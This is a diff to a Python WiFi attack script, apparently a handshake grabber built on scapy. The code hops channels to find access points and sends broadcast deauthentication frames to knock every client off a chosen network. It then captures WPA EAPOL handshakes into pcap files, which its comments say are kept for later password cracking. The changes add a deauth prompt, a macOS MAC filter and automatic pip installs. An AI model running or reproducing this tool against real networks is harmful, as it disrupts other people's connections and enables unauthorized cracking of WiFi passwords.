@@ -1,28 +1,29 @@
 #!/usr/bin/python
-
-from scapy.all import *
-import sys
 import signal
 import itertools
 import hashlib
 import hmac
 import os
+import sys
+import re
+import time
+import string
 import binascii
 try:
     from pbkdf2 import PBKDF2
 except:
     print("Missing module pbkdf2 Installing...")
     os.system("pip3 install pbkdf2")
-import binascii
-import hmac
-import hashlib
-import sys
-import re
-import time
-import string
+
+try:
+    from scapy.all import *
+except:
+    print("Missing module scapy Installing...")
+    os.system("pip3 install scapy")
 try:
     import netifaces
 except:
+     print("Missing module netifaces Installing...")
      os.system("pip3 install netifaces")
 
 #Global variables and banner:
@@ -42,7 +43,7 @@ TO_DS = 0b01
 chans = [1,2,3,4,5,6,7,8,9,10,11]
 TGREEN =  '\033[32m' # Green Text
 TWHITE = '\033[37m' #White (default) Text
-
+TRED = '\033[31m' #Red (warnings/errors)
 #AP class representing an access point
 class AP:
     def __init__(self,mac,ssid,channel,cipher):
@@ -114,7 +115,6 @@ def signal_handler2(signal,frame):
     banner()
     menu()
 
-
 #Check if the user is root
 def check_root():
     if not os.geteuid() == 0:
@@ -169,12 +169,9 @@ def enable_monitoring(interface_name):
 
 # Determines the encrytption type of the AP
 def get_encrytion(p):
-
     enc = []
-
     if p.subtype != 8:
         return enc
-
     packet = p
     if packet.haslayer(Dot11Elt):
         packet  = packet[Dot11Elt]
@@ -184,7 +181,6 @@ def get_encrytion(p):
             elif packet.ID == 221 and packet.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                 enc = "WPA"
             packet = packet.payload
-
     if not enc:
         if (p.FCfield & 0b01000000 != 0):
             enc = "WEP"
@@ -213,7 +209,8 @@ def packet_handler(packet):
 #The network sniffer simply hop between channels and sniff the wireless network around the user.
 def network_sniffer():
     i= 0
-    print("[INFO] Press Ctrl+c to stop the capture")
+    print(TGREEN,"[INFO]",TWHITE," Press Ctrl+c to stop the capture.")
+    print(TGREEN,"[INFO]",TWHITE," Looking for wireless access point, this could take a while")
     signal.signal(signal.SIGINT,signal_handler2) #Handle the ctrl+c to not quit and return to main menu.
     while True:
         sniff(iface=interface,prn=packet_handler,count=3,monitor=True)
@@ -225,6 +222,10 @@ def network_sniffer():
         time.sleep(1)
 #This function is going to deauth the clients on the specified AP
 def deauth(ap):
+    if OSX == True:
+        print(TRED,"Warning : ",TWHITE,"Apple airport cards do not support packet injection.")
+        print("No deauthing.")
+        return
     time.sleep(3)
     target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
     gateway_mac = ap.mac
@@ -244,11 +245,14 @@ def deauth(ap):
 #This function is checking if paquet contains EAPOL protocol.
 #It is saving the EAPOL paquet into a pcap file for later crack.
 #Return TRUE if the handshake was grabbed successfully.
+
+ap_filter = "" #To filter the AP mac addr because the scapy filter doesn't work on mac os.
 def checkForWPAHandshake(p):
     global from_frames
     global to_frames
+    global ap_filter
     pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
-    if EAPOL in p:
+    if EAPOL in p and ((str(p.addr2) == ap_filter) or (str(p.addr1) == ap_filter)):
         pktdump.write(p)
         to_ds = p.FCfield & TO_DS != 0 # Identify the direction of the message C->AP or AP->
         if to_ds:
@@ -267,10 +271,26 @@ def checkForWPAHandshake(p):
     else:
         return False
 
+#This function will launch a deauth to the given AP until the handshake is grabbed
+def init_deauth(ap):
+    choice = input("Would you like to deauth the AP ? (Yes/No) : ")
+    if choice == "Yes":
+        deauth(ap)
+        time.sleep(5)
+    elif choice == "No":
+        print("Not deauthing.")
+        return
+    else:
+        print("Bad input.")
+        init_deauth(ap)
+        return
+
 #This function is going to listen for the hanshake and try to capture it.
 #Once it is captured. It will be saved into a pcap file. (use the function wrpcap)
 #The pcap file can then be used to crack the password.
 def grab_handshake(ap):
+    global ap_filter
+    ap_filter = ap.mac
     if os.path.isfile("./handshake/handshake.pcap"):
         os.system("rm ./handshake/handshake.pcap") # In case the program was shutdown in the process
     os.system("clear")
@@ -281,19 +301,16 @@ def grab_handshake(ap):
         os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + interface + " --channel=%d" % ap.channel)
     print("Sniffing " + ap.ssid + "...")
     signal.signal(signal.SIGINT,signal_handler2)
-
     #Deauth the AP in a thread#
     from threading import Thread
-    t = Thread(target=deauth,args=(ap, ))
+    t = Thread(target=init_deauth,args=(ap, ))
     t.start()
     ############################
-    if OSX == False:
-        p = sniff(iface=interface, stop_filter=checkForWPAHandshake, filter='(ether dst '+ap.mac+') or (ether src '+ap.mac+')',monitor=True) #Sniff for handshake
-    else:
-        p = sniff(iface=interface, stop_filter=checkForWPAHandshake, monitor=True) #Sniff for handshake
+
+    #Start sniffing
+    p = sniff(iface=interface, stop_filter=checkForWPAHandshake, monitor=True) #Sniff for handshake
 
     #Out of the sniff function -> checkForWPAHandshake = True => Handshake grabbed
-
     print(TGREEN + "!Handshake Grabbed!" + TWHITE)
     t.join()
     os.system("mv ./handshake/handshake.pcap ./handshake/handshake-"+ap.ssid+".pcap")
@@ -307,10 +324,11 @@ def handshake_grabber():
     global to_frames
     from_frames = 0
     to_frames = 0
-
+    os.system("clear")
     signal.signal(signal.SIGINT, signal.SIG_DFL)
     if len(ap_list) == 0:
-        print("There is no access point sniffed yet, please start the network sniffer first.")
+        print(TGREEN,"No Access Point registred, Starting sniffing...",TWHITE)
+        network_sniffer()
     else:
         i = 0
         for ap in ap_list:
